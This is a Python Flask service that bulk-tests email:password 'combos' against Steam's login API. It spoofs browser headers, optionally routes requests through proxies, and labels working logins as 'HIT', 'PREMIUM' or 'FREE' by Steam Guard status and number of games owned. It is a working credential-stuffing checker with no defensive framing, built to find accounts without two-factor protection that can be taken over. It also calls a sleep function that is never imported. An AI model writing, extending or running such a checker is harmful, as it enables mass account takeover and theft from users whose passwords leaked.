from flask import Flask, request, jsonify
from flask_cors import CORS
import urllib.parse
import urllib.request
import urllib.error
from http.cookiejar import CookieJar
import json
import base64
import os

app = Flask(__name__)
CORS(app)

_RSA_URL     = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
_BEGIN_URL   = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
_POLL_URL    = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
_GAMES_URL   = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
_LOGIN_PAGE  = "https://store.steampowered.com/login/"

_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
_BASE_HDRS = {
    "User-Agent": _UA,
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Origin": "https://store.steampowered.com",
    "Referer": "https://store.steampowered.com/login/",
}

def _rsa_encrypt(password: str, mod_hex: str, exp_hex: str) -> str:
    mod     = int(mod_hex, 16)
    exp     = int(exp_hex, 16)
    key_len = (mod.bit_length() + 7) // 8
    msg     = password.encode("utf-8")
    pad_len = key_len - len(msg) - 3
    ps = bytearray()
    while len(ps) < pad_len:
        ps.extend(b for b in os.urandom(pad_len * 2) if b != 0)
    ps = bytes(ps[:pad_len])
    em = b"\x00\x02" + ps + b"\x00" + msg
    c  = pow(int.from_bytes(em, "big"), exp, mod)
    return base64.b64encode(c.to_bytes(key_len, "big")).decode("ascii")

def _make_opener(proxy_url=None):
    jar = CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    if proxy_url:
        handlers.append(urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}))
    return urllib.request.build_opener(*handlers)

def _post_form(opener, url, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    req  = urllib.request.Request(url, data=data, headers=dict(_BASE_HDRS))
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def _get_json(opener, url, params, timeout=20):
    full = url + "?" + urllib.parse.urlencode(params)
    req  = urllib.request.Request(full, headers=dict(_BASE_HDRS))
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def check_steam_account(username, password, proxy_url=None):
    opener = _make_opener(proxy_url)
    
    # Step 1: Seed cookie
    try:
        req = urllib.request.Request(_LOGIN_PAGE, headers=dict(_BASE_HDRS))
        opener.open(req, timeout=20).close()
    except: pass

    # Step 2: RSA Key
    s, r = _get_json(opener, _RSA_URL, {"account_name": username})
    rsa = (r.get("response") or {})
    if s != 200 or not rsa.get("publickey_mod"):
        return {"valid": False, "reason": f"Error RSA: HTTP {s}"}

    # Step 3: Encrypt
    try:
        enc_pass = _rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except Exception as exc:
        return {"valid": False, "reason": f"Error Encrypt: {exc}"}

    # Step 4: Begin Auth
    s, r = _post_form(opener, _BEGIN_URL, {
        "account_name": username,
        "encrypted_password": enc_pass,
        "encryption_timestamp": rsa["timestamp"],
        "remember_login": "true",
        "persistence": "1",
        "website_id": "Store",
    })

    resp = r.get("response") or {}
    eresult = resp.get("eresult", 0)

    if eresult in (5, 18) or s == 401:
        return {"valid": False, "reason": "Credenciales inválidas"}
    if s == 200 and not resp:
        return {"valid": False, "reason": "Credenciales inválidas"}
    if eresult == 84:
        return {"valid": False, "reason": "Rate Limited"}
    if not resp.get("client_id"):
        return {"valid": False, "reason": f"Error Auth: {s} (eresult {eresult})"}

    steamid = str(resp.get("steamid", ""))
    client_id = str(resp.get("client_id", ""))
    request_id = resp.get("request_id", "")

    confirmations = resp.get("allowed_confirmations") or []
    guard_types = {int(c.get("confirmation_type", 0)) for c in confirmations}
    has_guard = bool(guard_types - {0, 1})

    if has_guard:
        return {"valid": True, "reason": f"HIT (Requiere Steam Guard: {'Mobile' if 3 in guard_types or 4 in guard_types else 'Email'})"}

    # Step 5: Poll
    access_token = None
    for _ in range(3):
        s, r = _post_form(opener, _POLL_URL, {"client_id": client_id, "request_id": request_id})
        pr = r.get("response") or {}
        if pr.get("access_token"):
            access_token = pr["access_token"]
            break
        time.sleep(2)

    if not access_token:
        return {"valid": False, "reason": "Error Poll: no token"}

    # Step 6: Get Games
    s, r = _get_json(opener, _GAMES_URL, {
        "access_token": access_token, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "false"
    })
    
    game_count = 0
    games_list = []
    if s == 200:
        resp_games = r.get("response") or {}
        game_count = resp_games.get("game_count", 0)
        games_list = [g.get("name") for g in (resp_games.get("games") or [])[:5]]

    if game_count > 0:
        return {"valid": True, "reason": f"PREMIUM (Level, {game_count} juegos, sin 2FA)"}
    else:
        return {"valid": True, "reason": "FREE (0 juegos, sin 2FA)"}

@app.route('/api/check', methods=['POST', 'OPTIONS'])
def check_route():
    if request.method == 'OPTIONS':
        return '', 200
    
    data = request.json
    service = data.get('service')
    combos = data.get('combos', [])
    results = []

    for combo in combos:
        if ':' not in combo: continue
        email, password = combo.split(':', 1)
        
        if service == 'steam':
            res = check_steam_account(email, password)
            results.append({"email": email, "valid": res["valid"], "reason": res["reason"]})
        else:
            results.append({"email": email, "valid": False, "reason": "Servicio no soportado"})

    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))
